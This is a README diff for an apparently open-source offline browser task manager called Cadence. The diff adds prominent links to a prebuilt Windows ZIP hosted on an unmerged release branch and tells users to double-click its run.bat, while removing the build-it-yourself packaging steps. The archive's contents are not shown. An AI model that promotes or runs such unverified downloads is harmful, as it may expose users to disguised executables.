@@ -1,15 +1,67 @@
+<div align="center">
+
+<img src="public/icon-512.png" width="76" height="76" alt="Cadence app icon" />
+
 # Cadence
 
-A calm, offline-first task manager for focused teams. Cadence runs entirely in the browser: there is no backend, no analytics, and no server-side workspace. Tasks, projects, people, activity, and preferences stay in local storage on the device.
+**A calm, offline-first task manager for focused teams.**
 
-## Highlights
+No backend. No cloud account. No telemetry. The whole workspace lives in your browser and never leaves the device.
 
-- **Local-first by design** — the complete workspace persists in the browser, with JSON backup/restore and a generated PWA service worker for offline use.
-- **Persistent memory** — remembers the signed-in session, last route, last task, recent searches, sign-in history, theme, and workspace activity.
-- **Role-based access** — enforced `admin`, `manager`, `employee`, and `viewer` permissions across tasks, projects, people, comments, and workspace data.
-- **Focused workspace** — overview, list and board views, calendar, project pages, team directory, activity memory, command palette, and keyboard shortcuts.
-- **Thoughtful interface** — light, dark, and system themes; responsive desktop and mobile layouts; reduced-motion support; installable app icons.
-- **Hashed credentials** — local passwords use PBKDF2-SHA256 with 120,000 iterations through WebCrypto.
+[**Download for Windows**](https://github.com/theusercontent/cadence/raw/refs/heads/release/v1.1.0/releases/Cadence-Offline-v1.1.0-Windows.zip) ·
+[Run locally](#quick-start) ·
+[Take the tour](#a-quick-tour)
+
+![Cadence task list with per-task step progress bars](docs/screenshots/tasks.jpg)
+
+</div>
+
+---
+
+## Why Cadence
+
+Most task managers begin with an account and a server. Cadence begins with the work itself. It is a complete, installable task manager that runs as a static single-page app, keeps every byte of data in local browser storage, and stays useful when the network does not.
+
+- **Offline by construction** — no API, no database, no analytics. A generated service worker caches the app shell, so a reload without a connection still opens your workspace.
+- **Step progress you can see** — break a task into steps and completion fills the bar on task rows, board cards, calendar day panels, and the task sheet.
+- **Roles with real boundaries** — admin, manager, employee, and viewer permissions are enforced in the UI and in the store, not just hidden with CSS.
+- **Memory that helps** — restores your session, last route, last task, recent searches, sign-in history, theme, and workspace activity.
+- **Quietly fast** — command palette, keyboard shortcuts, instant local writes, and hash-based routes with no round trips.
+- **Private by default** — passwords hashed locally with PBKDF2-SHA256, a strict same-origin Content Security Policy, and JSON export/import for backups.
+
+## Step progress at a glance
+
+Every task can carry a small checklist. Cadence turns that checklist into readable progress: the bar uses the project color and shows the completed count beside it. A fully checked list reaches 100%, but the task stays open until someone decides it is actually done.
+
+![Task steps with a 2 of 3 progress bar](docs/screenshots/task-steps.jpg)
+
+## A quick tour
+
+| Board | Calendar |
+| --- | --- |
+| ![Board with step progress on cards](docs/screenshots/board.jpg) | ![Calendar day panel with step progress](docs/screenshots/calendar.jpg) |
+| **Command palette** | **Search memory** |
+| ![Command palette](docs/screenshots/palette.jpg) | ![Recent search and sign-in memory](docs/screenshots/memory.jpg) |
+| **Projects and people** | **Light and dark themes** |
+| ![Projects](docs/screenshots/projects.jpg) | ![Settings in the light theme](docs/screenshots/settings-light.jpg) |
+| **Responsive on mobile** | **Team directory** |
+| ![Mobile task list with step progress](docs/screenshots/mobile.jpg) | ![Team directory](docs/screenshots/team.jpg) |
+| **A quiet overview** | |
+| ![Overview](docs/screenshots/overview.jpg) | |
+
+## Try the offline Windows build
+
+The release ZIP is self-contained: it bundles a portable Node.js runtime, the prebuilt app, `run.bat`, and a license. There is no installer, no account, no administrator access, and no internet connection required.
+
+1. [Download `Cadence-Offline-v1.1.0-Windows.zip`](https://github.com/theusercontent/cadence/raw/refs/heads/release/v1.1.0/releases/Cadence-Offline-v1.1.0-Windows.zip) (30.5 MB).
+2. Extract the folder anywhere.
+3. Double-click `run.bat` and open the local URL it prints.
+
+```text
+SHA-256  77872907b43a2281bf793a71add362b6e6a1f4be097b50cf533b0a345f7d0d59
+```
+
+Checksums are also published in [`releases/SHA256SUMS.txt`](https://github.com/theusercontent/cadence/raw/refs/heads/release/v1.1.0/releases/SHA256SUMS.txt). Versioned ZIPs live on `release/*` branches so `main` stays source-only; release branches are never merged.
 
 ## Demo accounts
 
@@ -22,93 +74,60 @@ A calm, offline-first task manager for focused teams. Cadence runs entirely in t
 
 The demo passwords are public by design. Use **Settings → Reset demo workspace** to restore the seed data at any time.
 
-## Local development
+## Quick start
 
 ```bash
+git clone https://github.com/theusercontent/cadence.git
+cd cadence
 npm install
 npm run dev
 ```
 
-The development server is available at `http://localhost:5173`.
+Open `http://localhost:5173` and sign in with a demo account. Node.js 22 or later is recommended.
 
-## Production build
+Build and serve the production bundle locally:
 
 ```bash
 npm run build
 npm start
 ```
 
-`npm run build` type-checks the app, bundles the production assets, and generates `dist/sw.js` with a precache manifest. `npm start` serves the build with SPA fallback, long-lived asset caching, and no-store headers for the app shell and service worker.
+## How it is built
 
-Set `HOST` and `PORT` when needed:
+- **Stack** — React 19, TypeScript, Vite, lucide-react, and hand-written CSS. There is no runtime backend.
+- **Storage** — a versioned `localStorage` workspace (schema v2) with JSON export/import. Credentials are hashed with PBKDF2-SHA256 in WebCrypto and never leave the device.
+- **Offline** — `scripts/build-sw.mjs` generates a precache service worker and the app ships a web manifest, so Cadence installs like a PWA.
+- **Security** — the production server serves a strict same-origin CSP; connections, workers, media, and frames are all restricted to the app itself.
 
-```powershell
-$env:HOST = '0.0.0.0'; $env:PORT = '8080'; npm start
-```
-
-## Offline Windows package
-
-Create a self-contained Windows release with:
+### Verification
 
 ```bash
-npm run package:offline
+npm test          # 31 unit tests
+npm run build     # type-check, bundle, and generate the service worker
+node scripts/qa-smoke.mjs   # browser QA against a production server
 ```
 
-The ZIP is written to `%USERPROFILE%\Desktop\Cadence-Offline-v1.0.1-Windows.zip`. It includes the prebuilt app, a portable Node.js runtime, `run.bat`, `requirements.bat`, `README.txt`, and the Node.js license. Users only need to extract the folder and double-click `run.bat`; no npm install, account, administrator access, or internet connection is required.
+The browser suite walks through sign-in and session restore, offline reload, task creation, step progress, search, command palette memory, board drag and drop, calendar navigation, projects, invitations, backup validation, reset, every role boundary, and mobile layouts. Test artifacts land in `%TEMP%\opencode\cadence-qa`.
 
-## Verification
+### Deployment
+
+Cadence is a static single-page app and deploys to any host that can serve files and fall back to `index.html`.
 
 ```bash
-npm test
 npm run build
-```
-
-The test suite covers password hashing, password policy, session storage, role visibility and write boundaries, workspace mutations, memory, imports/exports, and reset behavior.
-
-A browser smoke suite is included for end-to-end verification. It requires Chrome and a production server:
-
-```powershell
-npm run build
-npm run prod
-# in a second terminal
-node scripts/qa-smoke.mjs
-```
-
-The smoke suite exercises sign-in and session restore, task creation, search, completion, command palette memory, route restoration, PWA/offline behavior, board drag and drop, calendar navigation, projects, invitations, backup validation, reset, every role boundary, mobile navigation, and a clean seed restore. Screenshots and a report are written to `%TEMP%\opencode\cadence-qa`.
-
-## Deployment
-
-Cadence is a static single-page app. Cloudflare Pages is the recommended free host: unlimited static requests and bandwidth, free HTTPS, and no card required. The build includes a `_headers` file that preserves the local-only Content Security Policy and cache behavior.
-
-1. Run `npm run build`.
-2. In the Cloudflare dashboard, create a Pages project and upload the contents of `dist/`.
-3. Use a unique project name; the free URL will be `https://<project-name>.pages.dev`.
-4. Leave build settings empty for a direct upload, or connect the repository with build command `npm run build` and output directory `dist`.
-
-Alternatively, deploy from the CLI after signing in to Cloudflare:
-
-```bash
 npx wrangler@latest pages deploy dist --project-name cadence-workspace
 ```
 
-For any static host:
-
-1. Publish `dist/`.
-2. Rewrite unknown paths to `index.html`.
-3. Serve over HTTPS so the service worker and PWA installation are enabled.
-4. Copy the security headers from `public/_headers` into the host's header configuration.
-
-Because routing is hash-based, deep links such as `/#/tasks` work without server rewrites, but the app shell itself still needs a fallback for non-root paths. Do not cache `sw.js` or `index.html` indefinitely; the generated service worker handles versioned app-shell caches. All data remains local to each browser, so there is no database or API to provision.
+Cloudflare Pages is the recommended free host. You can also upload `dist/` directly in the dashboard, or copy the security headers from `public/_headers` to another static host. Hash-based routes such as `/#/tasks` work without server rewrites.
 
 ## Privacy and security notes
 
-- The production server sends a restrictive Content Security Policy that only permits same-origin scripts, styles, connections, workers, and media capabilities, keeping the app local-only in practice as well as by design.
-- The workspace is stored in the browser and is readable by anyone with access to that browser profile. Backups contain hashed credentials and should be kept private.
-- Local accounts are suitable for a demo or an offline team utility, not as a replacement for central identity management.
+- The workspace is readable by anyone with access to the browser profile. Backups contain hashed credentials and should be kept private.
+- Local accounts are suitable for a demo or an offline team utility, not a replacement for central identity management.
 - Clearing browser storage permanently deletes the workspace. Export a backup first.
 - There is no password recovery beyond an admin resetting a local password from Team.
 
-## Structure
+## Project structure
 
 ```text
 src/
@@ -119,14 +138,28 @@ src/
   store/        central workspace state and CRUD
   styles/       CSS partials imported by styles.css
   test/         Vitest coverage
+docs/
+  screenshots/  README images
 scripts/
-  build-sw.mjs  generated offline service worker
-  serve.mjs     dependency-free production server
-  qa-smoke.mjs  browser end-to-end suite
-  package-offline.mjs  builds the portable Windows release
+  build-sw.mjs        generated offline service worker
+  serve.mjs           dependency-free production server
+  qa-smoke.mjs        browser end-to-end suite
+  package-offline.mjs portable Windows release builder
 packaging/
-  run.bat       Windows launcher for the portable release
-  requirements.bat  bundled-runtime and file check
-  README.txt    end-user offline guide
-  server.mjs    local server for the portable release
+  run.bat             Windows launcher for the portable release
+  requirements.bat    bundled-runtime and file check
+  README.txt          end-user offline guide
+  server.mjs          local server for the portable release
 ```
+
+## License
+
+Apache License 2.0 © 2026 THEUSERCONTENT. See [LICENSE](LICENSE).
+
+<div align="center">
+
+If Cadence fits the way your team works, a star helps more people find it.
+
+[Star Cadence on GitHub](https://github.com/theusercontent/cadence)
+
+</div>
